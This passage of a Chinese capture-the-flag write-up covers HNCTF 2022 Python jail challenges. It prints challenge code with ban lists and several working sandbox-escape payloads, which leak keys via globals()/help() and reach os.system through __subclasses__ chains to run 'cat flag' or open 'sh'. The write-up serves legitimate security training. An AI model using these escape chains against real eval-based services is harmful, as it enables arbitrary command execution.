+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">└─$ nc node5.anna.nssctf.cn 20335</span><br><span class="line"></span><br><span class="line">  _       _          _       _          _       _</span><br><span class="line"> | |     | |        | |     | |        | |     | |</span><br><span class="line"> | | __ _| | _____  | | __ _| | _____  | | __ _| | _____</span><br><span class="line"> | |/ _` | |/ / _ \ | |/ _` | |/ / _ \ | |/ _` | |/ / _  | | (_| |   &lt;  __/ | | (_| |   &lt;  __/ | | (_| |   &lt;  __/</span><br><span class="line"> |_|\__,_|_|\_\___| |_|\__,_|_|\_\___| |_|\__,_|_|\_\___|                                                               </span><br><span class="line"></span><br><span class="line">Now the program has two <span class="built_in">functions</span></span><br><span class="line">can you use dockerdoor</span><br><span class="line">1.func</span><br><span class="line">2.backdoor</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+
+<p>有两个主要的通道，先走1看一下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>():</span><br><span class="line">    code = <span class="built_in">input</span>(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">len</span>(code)&gt;<span class="number">9</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">print</span>(<span class="string">&quot;you&#x27;re hacker!&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">eval</span>(code))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
+<p>这里可以任意执行9字符，然后看backdoor，我们应该是要得到一个密钥，然后走backdoor<br>那我们直接用globals来读密钥即可</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="function"><span class="title">globals</span></span>()</span><br><span class="line">&#123;<span class="string">&#x27;__name__&#x27;</span>: <span class="string">&#x27;__main__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>: None, <span class="string">&#x27;__package__&#x27;</span>: None, <span class="string">&#x27;__loader__&#x27;</span>: &lt;_frozen_importlib_external.SourceFileLoader object at 0x7f66d2abca90&gt;, <span class="string">&#x27;__spec__&#x27;</span>: None, <span class="string">&#x27;__annotations__&#x27;</span>: &#123;&#125;, <span class="string">&#x27;__builtins__&#x27;</span>: &lt;module <span class="string">&#x27;builtins&#x27;</span> (built-in)&gt;, <span class="string">&#x27;__file__&#x27;</span>: <span class="string">&#x27;/home/ctf/./server.py&#x27;</span>, <span class="string">&#x27;__cached__&#x27;</span>: None, <span class="string">&#x27;key_9b1d015375213e21&#x27;</span>: <span class="string">&#x27;a34af94e88aed5c34fb5ccfe08cd14ab&#x27;</span>, <span class="string">&#x27;func&#x27;</span>: &lt;<span class="keyword">function</span> func at 0x7f66d2c57d90&gt;, <span class="string">&#x27;backdoor&#x27;</span>: &lt;<span class="keyword">function</span> backdoor at 0x7f66d2b1dfc0&gt;, <span class="string">&#x27;WELCOME&#x27;</span>: <span class="string">&#x27;\n  _       _          _       _          _       _        \n | |     | |        | |     | |        | |     | |       \n | | __ _| | _____  | | __ _| | _____  | | __ _| | _____ \n | |/ _` | |/ / _ \\ | |/ _` | |/ / _ \\ | |/ _` | |/ / _  | | (_| |   &lt;  __/ | | (_| |   &lt;  __/ | | (_| |   &lt;  __/\n |_|\\__,_|_|\\_\\___| |_|\\__,_|_|\\_\\___| |_|\\__,_|_|\\_\\___|                                                                                                                                                                     \n&#x27;</span>, <span class="string">&#x27;input_data&#x27;</span>: <span class="string">&#x27;1&#x27;</span>&#125;</span><br></pre></td></tr></table></figure>
+<p>有了密钥之后直接按代码逻辑走backdoor即可</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.func</span><br><span class="line">2.backdoor</span><br><span class="line">&gt; 2</span><br><span class="line">Please enter the admin key</span><br><span class="line">&gt;a34af94e88aed5c34fb5ccfe08cd14ab</span><br><span class="line">&gt;open(<span class="string">&quot;flag&quot;</span>).<span class="built_in">read</span>()</span><br><span class="line">flag=NSSCTF&#123;3fa7224f-5cff-42f6-bfdc-5b1063c348fc&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="HNCTF-2022-Week1-l-ke-l-ke-l-ke-JAIL"><a href="#HNCTF-2022-Week1-l-ke-l-ke-l-ke-JAIL" class="headerlink" title="[HNCTF 2022 Week1]l@ke l@ke l@ke(JAIL)"></a>[HNCTF 2022 Week1]l@ke l@ke l@ke(JAIL)</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#it seems have a backdoor as `lake lake lake`</span></span><br><span class="line"><span class="comment">#but it seems be limited!</span></span><br><span class="line"><span class="comment">#can u find the key of it and use the backdoor</span></span><br><span class="line"></span><br><span class="line">fake_key_var_in_the_local_but_real_in_the_remote = <span class="string">&quot;[DELETED]&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>():</span><br><span class="line">    code = <span class="built_in">input</span>(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">len</span>(code)&gt;<span class="number">6</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">print</span>(<span class="string">&quot;you&#x27;re hacker!&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">eval</span>(code))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">backdoor</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Please enter the admin key&quot;</span>)</span><br><span class="line">    key = <span class="built_in">input</span>(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span>(key == fake_key_var_in_the_local_but_real_in_the_remote):</span><br><span class="line">        code = <span class="built_in">input</span>(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">eval</span>(code))</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Nooo!!!!&quot;</span>)</span><br><span class="line"></span><br><span class="line">WELCOME = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">  _         _          _         _          _         _        </span></span><br><span class="line"><span class="string"> | |  ____ | |        | |  ____ | |        | |  ____ | |       </span></span><br><span class="line"><span class="string"> | | / __ \| | _____  | | / __ \| | _____  | | / __ \| | _____ </span></span><br><span class="line"><span class="string"> | |/ / _` | |/ / _ \ | |/ / _` | |/ / _ \ | |/ / _` | |/ / _ \</span></span><br><span class="line"><span class="string"> | | | (_| |   &lt;  __/ | | | (_| |   &lt;  __/ | | | (_| |   &lt;  __/</span></span><br><span class="line"><span class="string"> |_|\ \__,_|_|\_\___| |_|\ \__,_|_|\_\___| |_|\ \__,_|_|\_\___|</span></span><br><span class="line"><span class="string">     \____/               \____/               \____/                                                                                                                                                                                                                                        </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(WELCOME)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Now the program has two functions&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;can you use dockerdoor&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;1.func&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;2.backdoor&quot;</span>)</span><br><span class="line">input_data = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line"><span class="keyword">if</span>(input_data == <span class="string">&quot;1&quot;</span>):</span><br><span class="line">    func()</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">elif</span>(input_data == <span class="string">&quot;2&quot;</span>):</span><br><span class="line">    backdoor()</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;not found the choice&quot;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+<p>只能任意执行6字符</p>
+<p>6字符就能想到是help()<br>但是不能执行globals()</p>
+<p>这里Google了一下，server和__main__都可以查看到全局变量</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">help</span>&gt; server</span><br><span class="line">Help on module server:</span><br><span class="line"></span><br><span class="line">NAME</span><br><span class="line">    server</span><br><span class="line"></span><br><span class="line">DESCRIPTION</span><br><span class="line">    <span class="comment">#it seems have a backdoor as `lake lake lake`</span></span><br><span class="line">    <span class="comment">#but it seems be limited!</span></span><br><span class="line">    <span class="comment">#can u find the key of it and use the backdoor</span></span><br><span class="line"></span><br><span class="line">FUNCTIONS</span><br><span class="line">    backdoor()</span><br><span class="line"></span><br><span class="line">    func()</span><br><span class="line"></span><br><span class="line">DATA</span><br><span class="line">    WELCOME = <span class="string">&#x27;\n  _         _          _         _          _  ...       ...</span></span><br><span class="line"><span class="string">    input_data = &#x27;</span>1<span class="string">&#x27;</span></span><br><span class="line"><span class="string">    key_9d38ee7f31d6126d = &#x27;</span>95c720690c2c83f0982ffba63ff87338<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">FILE</span></span><br><span class="line"><span class="string">    /home/ctf/server.py</span></span><br></pre></td></tr></table></figure>
+<p>整到了key，后面就很好整了</p>
+<h2 id="HNCTF-2022-WEEK2-calc-jail-beginner-level4-JAIL"><a href="#HNCTF-2022-WEEK2-calc-jail-beginner-level4-JAIL" class="headerlink" title="[HNCTF 2022 WEEK2]calc_jail_beginner_level4(JAIL)"></a>[HNCTF 2022 WEEK2]calc_jail_beginner_level4(JAIL)</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#No danger function,no chr,Try to hack me!!!!</span></span><br><span class="line"><span class="comment">#Try to read file ./flag</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BANLIST = [<span class="string">&#x27;__loader__&#x27;</span>, <span class="string">&#x27;__import__&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;chr&#x27;</span>]</span><br><span class="line"></span><br><span class="line">eval_func = <span class="built_in">eval</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> BANLIST:</span><br><span class="line">    <span class="keyword">del</span> __builtins__.__dict__[m]</span><br><span class="line"></span><br><span class="line"><span class="keyword">del</span> __loader__, __builtins__</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">filter</span>(<span class="params">s</span>):</span><br><span class="line">    not_allowed = <span class="built_in">set</span>(<span class="string">&#x27;&quot;\&#x27;`&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">any</span>(c <span class="keyword">in</span> not_allowed <span class="keyword">for</span> c <span class="keyword">in</span> s)</span><br><span class="line"></span><br><span class="line">WELCOME = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">  _                _                           _       _ _   _                _ _  _   </span></span><br><span class="line"><span class="string"> | |              (_)                         (_)     (_) | | |              | | || |  </span></span><br><span class="line"><span class="string"> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| | || |_ </span></span><br><span class="line"><span class="string"> | &#x27;_ \ / _ \/ _` | | &#x27;_ \| &#x27;_ \ / _ \ &#x27;__|   | |/ _` | | | | |/ _ \ \ / / _ \ |__   _|</span></span><br><span class="line"><span class="string"> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ |  | |  </span></span><br><span class="line"><span class="string"> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_|  |_|  </span></span><br><span class="line"><span class="string">              __/ |                          _/ |                                      </span></span><br><span class="line"><span class="string">             |___/                          |__/                                                                                                                                             </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(WELCOME)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Welcome to the python jail&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Let&#x27;s have an beginner jail of calc&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Enter your expression and I will evaluate it for you.&quot;</span>)</span><br><span class="line">input_data = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">filter</span>(input_data):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Oh hacker!&quot;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Answer: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(eval_func(input_data)))</span><br></pre></td></tr></table></figure>
+
+<p>被ban了好多东西，包括我们的chr，但是他这里没对unicode做出明确限制(没有ASCII过滤)，一般来说都可以尝试unicode绕过</p>
+<p>但是由于太通用，一般都是会被ban的，所以我们这里还是用str和bytes([]).decode来绕过</p>
+<p>payload</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">open</span>((<span class="built_in">bytes</span>([<span class="number">102</span>])+<span class="built_in">bytes</span>([<span class="number">108</span>])+<span class="built_in">bytes</span>([<span class="number">97</span>])+<span class="built_in">bytes</span>([<span class="number">103</span>])).decode()).read()</span><br><span class="line"></span><br><span class="line"><span class="built_in">open</span>(<span class="built_in">str</span>(().__class__.__new__)[<span class="number">26</span>]+<span class="built_in">str</span>(().__class__.__new__)[<span class="number">4</span>]+<span class="built_in">str</span>(().__class__)[<span class="number">3</span>]+<span class="built_in">str</span>(().__getitem__)[<span class="number">19</span>]).read()</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="HNCTF-2022-WEEK2-calc-jail-beginner-level4-0-5-JAIL"><a href="#HNCTF-2022-WEEK2-calc-jail-beginner-level4-0-5-JAIL" class="headerlink" title="[HNCTF 2022 WEEK2]calc_jail_beginner_level4.0.5(JAIL)"></a>[HNCTF 2022 WEEK2]calc_jail_beginner_level4.0.5(JAIL)</h2><p>这题怎么没附件了?纯黑盒?</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">└─$ nc node5.anna.nssctf.cn 26453</span><br><span class="line"></span><br><span class="line">  _                _                           _       _ _   _                _ _  _    ___   _____</span><br><span class="line"> | |              (_)                         (_)     (_) | | |              | | || |  / _ \ | ____|</span><br><span class="line"> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| | || |_| | | || |__</span><br><span class="line"> | <span class="string">&#x27;_ \ / _ \/ _` | | &#x27;</span>_ \| <span class="string">&#x27;_ \ / _ \ &#x27;</span>__|   | |/ _` | | | | |/ _ \ \ / / _ \ |__   _| | | ||___ \</span><br><span class="line"> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ |  | |_| |_| | ___) |</span><br><span class="line"> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_|  |_(_)\___(_)____/</span><br><span class="line">              __/ |                          _/ |</span><br><span class="line">             |___/                          |__/                                                                        </span><br><span class="line"></span><br><span class="line">Welcome to the python jail</span><br><span class="line">Let<span class="string">&#x27;s have an beginner jail of calc</span></span><br><span class="line"><span class="string">Enter your expression and I will evaluate it for you.</span></span><br><span class="line"><span class="string">Banned __loader__,__import__,compile,eval,exec,chr,input,locals,globals and `,&quot;,&#x27;</span> Good luck!</span><br></pre></td></tr></table></figure>
+
+<p>连接之后发现有ban名单，但是依旧没有ban我们上题的两个函数，那么上题的payload直接打即可<br>或者说想要执行system(“cat flag”)，就打如下payload</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[].__class__.__mro__[-<span class="number">1</span>].__subclasses__()[-<span class="number">4</span>].__init__.__globals__[(<span class="built_in">bytes</span>([<span class="number">115</span>])+<span class="built_in">bytes</span>([<span class="number">121</span>])+<span class="built_in">bytes</span>([<span class="number">115</span>])+<span class="built_in">bytes</span>([<span class="number">116</span>])+<span class="built_in">bytes</span>([<span class="number">101</span>])+<span class="built_in">bytes</span>([<span class="number">109</span>])).decode()]((<span class="built_in">bytes</span>([<span class="number">99</span>])+<span class="built_in">bytes</span>([<span class="number">97</span>])+<span class="built_in">bytes</span>([<span class="number">116</span>])+<span class="built_in">bytes</span>([<span class="number">32</span>])+<span class="built_in">bytes</span>([<span class="number">102</span>])+<span class="built_in">bytes</span>([<span class="number">108</span>])+<span class="built_in">bytes</span>([<span class="number">97</span>])+<span class="built_in">bytes</span>([<span class="number">103</span>])).decode())</span><br></pre></td></tr></table></figure>
+<p>也就是</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[].__class__.__mro__[-<span class="number">1</span>].__subclasses__()[-<span class="number">4</span>].__init__.__globals__[<span class="string">&#x27;system&#x27;</span>](<span class="string">&#x27;cat flag&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p>这个传统链子</p>
+<h2 id="HNCTF-2022-WEEK2-calc-jail-beginner-level4-1-JAIL"><a href="#HNCTF-2022-WEEK2-calc-jail-beginner-level4-1-JAIL" class="headerlink" title="[HNCTF 2022 WEEK2]calc_jail_beginner_level4.1(JAIL)"></a>[HNCTF 2022 WEEK2]calc_jail_beginner_level4.1(JAIL)</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">└─$ nc node5.anna.nssctf.cn 20570</span><br><span class="line"></span><br><span class="line">  _                _                           _       _ _   _                _ _  _  __</span><br><span class="line"> | |              (_)                         (_)     (_) | | |              | | || |/_ |</span><br><span class="line"> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| | || |_| |</span><br><span class="line"> | <span class="string">&#x27;_ \ / _ \/ _` | | &#x27;</span>_ \| <span class="string">&#x27;_ \ / _ \ &#x27;</span>__|   | |/ _` | | | | |/ _ \ \ / / _ \ |__   _| |</span><br><span class="line"> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ |  | |_| |</span><br><span class="line"> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_|  |_(_)_|</span><br><span class="line">              __/ |                          _/ |</span><br><span class="line">             |___/                          |__/                                                                        </span><br><span class="line"></span><br><span class="line">Welcome to the python jail</span><br><span class="line">Let<span class="string">&#x27;s have an beginner jail of calc</span></span><br><span class="line"><span class="string">Enter your expression and I will evaluate it for you.</span></span><br><span class="line"><span class="string">Banned __loader__,__import__,compile,eval,exec,chr,input,locals,globals,bytes and `,&quot;,&#x27;</span> Good luck!</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+
+<p>没ban str<br>也是经典payload了<br>丸辣，flag这个目录不存在，那我们只能执行系统命令去ls看一下目录了</p>
+<p>具体的绕过方法为</p>
+<ol>
+<li>type获取bytes</li>
+</ol>
+<p>众所周知:bytes &#x3D; type(str(1).encode())<br>那么很容易就可以构造出payload</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[].__class__.__mro__[-<span class="number">1</span>].__subclasses__()[-<span class="number">4</span>].__init__.__globals__[(<span class="built_in">type</span>(<span class="built_in">str</span>(<span class="number">1</span>).encode())([<span class="number">115</span>])+<span class="built_in">type</span>(<span class="built_in">str</span>(<span class="number">1</span>).encode())([<span class="number">121</span>])+<span class="built_in">type</span>(<span class="built_in">str</span>(<span class="number">1</span>).encode())([<span class="number">115</span>])+<span class="built_in">type</span>(<span class="built_in">str</span>(<span class="number">1</span>).encode())([<span class="number">116</span>])+<span class="built_in">type</span>(<span class="built_in">str</span>(<span class="number">1</span>).encode())([<span class="number">101</span>])+<span class="built_in">type</span>(<span class="built_in">str</span>(<span class="number">1</span>).encode())([<span class="number">109</span>])).decode()]((<span class="built_in">type</span>(<span class="built_in">str</span>(<span class="number">1</span>).encode())([<span class="number">108</span>])+<span class="built_in">type</span>(<span class="built_in">str</span>(<span class="number">1</span>).encode())([<span class="number">115</span>])).decode())</span><br></pre></td></tr></table></figure>
+<p>可以执行ls，同理也可以执行cat等</p>
+<ol start="2">
+<li>利用Show subclasses with tuple找到bytes类</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()</span><br></pre></td></tr></table></figure>
+<p>直接查看发现bytes类的索引是6，那么构造链子</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()[-<span class="number">4</span>].__init__.__globals__[().__class__.__base__.__subclasses__()[<span class="number">6</span>]([<span class="number">115</span>, <span class="number">121</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">109</span>]).decode()](().__class__.__base__.__subclasses__()[<span class="number">6</span>]([<span class="number">115</span>, <span class="number">104</span>]).decode())</span><br></pre></td></tr></table></figure>
+<p>直接进sh执行系统命令</p>
+<ol start="3">
+<li>[].__doc__获取字符</li>
+</ol>
+<p>这个应该是这里面最传统的方法了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()[-<span class="number">4</span>].__init__.__globals__[().__doc__[<span class="number">19</span>]+().__doc__[<span class="number">86</span>]+().__doc__[<span class="number">19</span>]+().__doc__[<span class="number">4</span>]+().__doc__[<span class="number">17</span>]+().__doc__[<span class="number">10</span>]](().__doc__[<span class="number">19</span>]+().__doc__[<span class="number">56</span>])</span><br></pre></td></tr></table></figure>
+
+<p>有不懂的可以自行AI</p>
+<h2 id="HNCTF-2022-WEEK2-calc-jail-beginner-level4-2-JAIL"><a href="#HNCTF-2022-WEEK2-calc-jail-beginner-level4-2-JAIL" class="headerlink" title="[HNCTF 2022 WEEK2]calc_jail_beginner_level4.2(JAIL)"></a>[HNCTF 2022 WEEK2]calc_jail_beginner_level4.2(JAIL)</h2><p>连接发现+被ban</p>
+<p>那么就用</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.__add__</span><br></pre></td></tr></table></figure>
+<p>来绕过</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[].__class__.__mro__[-<span class="number">1</span>].__subclasses__()[-<span class="number">4</span>].__init__.__globals__[(<span class="built_in">type</span>(<span class="built_in">str</span>(<span class="number">1</span>).encode())([<span class="number">115</span>]).__add__(<span class="built_in">type</span>(<span class="built_in">str</span>(<span class="number">1</span>).encode())([<span class="number">121</span>])).__add__(<span class="built_in">type</span>(<span class="built_in">str</span>(<span class="number">1</span>).encode())([<span class="number">115</span>])).__add__(<span class="built_in">type</span>(<span class="built_in">str</span>(<span class="number">1</span>).encode())([<span class="number">116</span>])).__add__(<span class="built_in">type</span>(<span class="built_in">str</span>(<span class="number">1</span>).encode())([<span class="number">101</span>])).__add__(<span class="built_in">type</span>(<span class="built_in">str</span>(<span class="number">1</span>).encode())([<span class="number">109</span>]))).decode()]((<span class="built_in">type</span>(<span class="built_in">str</span>(<span class="number">1</span>).encode())([<span class="number">108</span>]).__add__(<span class="built_in">type</span>(<span class="built_in">str</span>(<span class="number">1</span>).encode())([<span class="number">115</span>]))).decode())</span><br></pre></td></tr></table></figure>
+<p>然后就</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[].__class__.__mro__[-<span class="number">1</span>].__subclasses__()[-<span class="number">4</span>].__init__.__globals__[(<span class="built_in">type</span>(<span class="built_in">str</span>(<span class="number">1</span>).encode())([<span class="number">115</span>]).__add__(<span class="built_in">type</span>(<span class="built_in">str</span>(<span class="number">1</span>).encode())([<span class="number">121</span>])).__add__(<span class="built_in">type</span>(<span class="built_in">str</span>(<span class="number">1</span>).encode())([<span class="number">115</span>])).__add__(<span class="built_in">type</span>(<span class="built_in">str</span>(<span class="number">1</span>).encode())([<span class="number">116</span>])).__add__(<span class="built_in">type</span>(<span class="built_in">str</span>(<span class="number">1</span>).encode())([<span class="number">101</span>])).__add__(<span class="built_in">type</span>(<span class="built_in">str</span>(<span class="number">1</span>).encode())([<span class="number">109</span>]))).decode()]((<span class="built_in">type</span>(<span class="built_in">str</span>(<span class="number">1</span>).encode())([<span class="number">99</span>]).__add__(<span class="built_in">type</span>(<span class="built_in">str</span>(<span class="number">1</span>).encode())([<span class="number">97</span>])).__add__(<span class="built_in">type</span>(<span class="built_in">str</span>(<span class="number">1</span>).encode())([<span class="number">116</span>])).__add__(<span class="built_in">type</span>(<span class="built_in">str</span>(<span class="number">1</span>).encode())([<span 